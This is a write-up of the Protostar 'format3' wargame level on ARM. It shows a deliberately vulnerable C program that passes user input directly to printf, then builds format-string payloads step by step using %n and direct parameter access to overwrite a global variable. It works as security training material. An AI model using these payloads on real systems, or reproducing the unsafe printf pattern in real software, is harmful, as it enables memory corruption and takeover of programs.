## Protostar ARM format3

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);

  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

#### _Let's start_


This challenge is pretty similar to the challenge `format2` but this time we must be able to write 4 bytes to change the value related to the variable `target`.  

We will start from the solution used in `format2` and we will _"extend"_ it to solve this challenge.

Before we have to understand, as usual in the previous challenges, the position of our input

```code
pi@raspberrypi:~/protostar/format/format3 $ echo  "`python -c "print 'AAAA'+'%08x '*20 + '%x'"`" | ./format3
AAAA00000000 00000001 7edbd270 000103bc 7edbd270 7edbd474 00010500 41414141 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078
target is 00000000 :(
pi@raspberrypi:~/protostar/format/format3 $

```

and we have to find the address of the variable `target` which is `0x01010110`

```code
pi@raspberrypi:~/protostar/format/format3 $ objdump -t format3 | grep target
01010110 g     O .bss	00000004              target
```

In the previous challenge we changed only the first byte which represents an integer (4 bytes) but this time, we will change all the bytes representing the integer.
So if the variable `target` starts at `0x01010110` its value is in memory are also in the addresses `0x01010111`, `0x01010112` and `0x01010113` and how as done in `format2` we can use _**Direct Parameter Access Parameter**_ to change byte by byte.



```code
pi@raspberrypi:~/protostar/format/format3 $ python -c 'print "\x10\x01\x01\x01\x11\x01\x01\x01\x12\x01\x01\x01\x13\x01\x01\x01%8$n%9$n%10$n%11$n"' | ./format3

target is 10101010 :(
```

The value of each byte is `0x10` as the bytes printed for the addresses `(4 addresses * 4bytes)` . What we have to do now, is to figure out how many bytes write to make, step by step, our variable `target` = `0x01025544`.


`0x44 - 0x10 = 0x34 = 52` -> `%52d%8\$n`

```code
pi@raspberrypi:~/protostar/format/format3 $ python -c "print '\x10\x01\x01\x01\x11\x01\x01\x01\x12\x01\x01\x01\x13\x01\x01\x01%52d%8\$n'" | ./format3
                                                   0
target is 00000044 :(
```

`0x55 - 0x44 = 0x11 = 17` -> `%17d%9\$n`

```code
pi@raspberrypi:~/protostar/format/format3 $ python -c "print '\x10\x01\x01\x01\x11\x01\x01\x01\x12\x01\x01\x01\x13\x01\x01\x01%52d%8\$n%17d%9\$n'" | ./format3
                                                   0                1
target is 00005544 :(
```

To change the third and the forth bytes we have a little problem because `0x02` is smaller than `0x85` and `0x01` is smaller than `0x02`. Let's try if we can change both of them using an overflow on the third byte in order to have it set to `0x02` and the forth byte set to `0x01` (overflow from the third byte).

`0x102 - 0x55 = 0xAD = 173` -> `%173d%10\$n`

```
pi@raspberrypi:~/protostar/format/format3 $ python -c "print '\x10\x01\x01\x01\x11\x01\x01\x01\x12\x01\x01\x01\x13\x01\x01\x01%52d%8\$n%17d%9\$n%173d%10\$n'" | ./format3
                                                   0                1                                                                                                                                                                   2124608128
you have modified the target :)
```

__*Done :)*__
